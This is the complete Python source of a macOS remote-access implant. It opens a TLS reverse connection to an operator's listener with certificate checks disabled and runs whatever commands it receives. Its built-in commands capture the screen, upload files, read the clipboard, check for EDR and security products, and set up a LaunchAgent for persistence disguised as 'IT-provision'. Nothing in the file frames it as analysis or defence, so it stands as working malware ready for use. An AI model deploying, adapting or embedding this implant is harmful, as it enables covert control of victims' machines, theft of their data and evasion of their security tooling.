import socket
import sys
import commands
import os
import ssl
import pty
   
#note:disabling SSL certificate verification since the cert generated will not be trusted, which would halt the connection
context = ssl._create_unverified_context()

try:
    s = socket.create_connection(('127.0.0.1', 443))
    hostname = commands.getstatusoutput("hostname")

    ssock = context.wrap_socket(s, server_hostname='127.0.0.1')
    canary = 'MacShellIzC00lz'
    ssock.send(canary.encode('utf8'))
    
    while True:
        a = ssock.recv(9000).decode('utf8')
        command = str(a)
        if 'exit' in command:
            sys.exit(0)
        elif 'screencapture' in command:
            try:
                execute = str(commands.getstatusoutput("%s" % command))
                with open('out.jpg', 'rb') as file:
                    data = file.read() 
                    ssock.sendall(data)
                    ssock.send('!EOF!'.encode('utf8'))
                file.close()
                
                commands.getstatusoutput("rm -f out.jpg")
            except Exception as e:
                ssock.send(str(e).encode('utf8'))

        elif 'download ' in command:
            command2 = command.replace('download ', '')
            try:
                with open ("%s" % str(command2), 'rb') as file:
                    data = file.read()
                    ssock.sendall(data)
                    ssock.send('!EOF!'.encode('utf8'))
                file.close()
            except Exception as e:
                ssock.send(str(e).encode('utf8'))

        elif 'clipboard' in command:
            try:
                execute = str(commands.getstatusoutput("%s" % command))
                ssock.sendall(execute.encode('utf8'))
                ssock.send('!EOF!'.encode('utf8'))
            except Exception as e:
                ssock.send(str(e).encode('utf8'))
            
        elif 'popup' in command:
            try:
                execute = str(commands.getstatusoutput("%s" % command))
                ssock.send(execute.encode('utf8'))
            except Exception as e:
                ssock.send(str(e).encode('utf8'))

        elif 'lsof -i' in command:
            try:
                execute = str(commands.getstatusoutput("%s" % command))
                ssock.sendall(execute.encode('utf8'))
                ssock.send('!EOF!'.encode('utf8'))
            except Exception as e:
                ssock.send(str(e).encode('utf8'))

        elif '[0-9]|ssh|scp' in command:
            try:
                execute = str(commands.getstatusoutput("%s" % command))
                ssock.send(execute.encode('utf8'))
                ssock.send('!EOF!'.encode('utf8'))
            except Exception as e:
                ssock.send(str(e).encode('utf8'))

        elif 'ifconfig | sed' in command:
            try:
                execute = str(commands.getstatusoutput("%s" % command))
                ssock.send(execute.encode('utf8'))
            except Exception as e:
                ssock.send(str(e).encode('utf8'))
        
        elif 'checksecurity' in command:
            try:
                x = "ps -eo command | egrep 'CbOsxSensorService|CbDefense|ESET|snitch|xagt|falconctl|GlobalProtect|OpenDNS|HostChecker'"
                execute = str(commands.getstatusoutput("%s" % x))
                ssock.send(execute.encode('utf8'))
            except Exception as e:
                ssock.send(str(e).encode('utf8'))

        elif ' -al' in command:
            try:
                execute = str(commands.getstatusoutput("%s" % command))
                ssock.send(execute.encode('utf8'))
                ssock.send('!EOF!'.encode('utf8'))
            except Exception as e:
                ssock.send(str(e).encode('ut8f'))

        elif 'cd ' in command:
            command2 = command.replace('cd ', '')
            try:
                os.chdir("%s" % command2)
                x = str(commands.getstatusoutput("pwd"))
                ssock.send(x.encode('utf8'))
            except:
                x = 'Directory not found.'
                ssock.send(x.encode('utf8'))
            
        elif 'persist' in command:
            try:
                username = str(commands.getstatusoutput("whoami"))
                username2 = username.replace("(0, '", '').replace("')",'')
                filename = sys.argv[0]
                os.system("mkdir /Users/%s/.IT-provision" % username2)
                os.system("cp %s /Users/%s/.IT-provision/provision.py" % (filename,username2))
                os.system("chmod +x /Users/%s/.IT-provision/provision.py" % username2)
                os.system("echo '<plist version=\"1.0\">' >> com.it.provision.plist")
                os.system("echo '    <dict>' >> com.it.provision.plist")
                os.system("echo '    <key>Label</key>' >> com.it.provision.plist")
                os.system("echo '        <string>com.it.provision</string>' >> com.it.provision.plist")
                os.system("echo '    <key>ProgramArguments</key>' >> com.it.provision.plist")
                os.system("echo '    <array>' >> com.it.provision.plist")
                os.system("echo '        <string>/usr/bin/python</string>' >> com.it.provision.plist")
                os.system("echo '        <string>/Users/%s/.IT-provision/provision.py</string>' >> com.it.provision.plist" % username2)
                os.system("echo '    </array>' >> com.it.provision.plist")
                os.system("echo '    <key>RunAtLoad</key>' >> com.it.provision.plist")
                os.system("echo '        <true/>' >> com.it.provision.plist")
                os.system("echo '    <key>AbandonProcessGroup</key>' >> com.it.provision.plist")
                os.system("echo '        <true/>' >> com.it.provision.plist")
                os.system("echo '    </dict>' >> com.it.provision.plist")
                os.system("echo '</plist>' >> com.it.provision.plist")
                os.system("cp com.it.provision.plist ~/Library/LaunchAgents/")
                os.system("launchctl load com.it.provision.plist")
                os.system("rm -f com.it.provision.plist")
                text = "[+] Launch Daemon persistence successfully set"
                ssock.send(text.encode('utf8'))
            except Exception as e:
                ssock.send(str(e).encode('utf8'))
        elif 'remove' in command:
            try:
                username = str(commands.getstatusoutput("whoami"))
                username2 = username.replace("(0, '", '').replace("')",'')
                filename = sys.argv[0]
                os.system("launchctl unload ~/Library/LaunchAgents/com.it.provision.plist")
                os.system("rm -rf /Users/%s/.IT-provision" % username2)
                os.system("rm -f ~/Library/LaunchAgents/com.it.provision.plist")
                text = "[+] Successfully removed launch agent persistence"
                ssock.send(text.encode('utf8'))
            except Exception as e:
                ssock.send(str(e).encode('utf8'))

        elif 'delete login' in command:
            try:
                execute = str(commands.getstatusoutput("%s" % command))
                ssock.send(execute.encode('utf8'))
                os.system("rm -f provision_script.command")
            except Exception as e:
                ssock.send(str(e).encode('utf8'))
            
        else:
            try:
                execute = str(commands.getstatusoutput("%s" % command))
                ssock.send(execute.encode('utf8'))
            except Exception as e:
                ssock.send(str(e).encode('utf8'))

except Exception as e:
    print(e)
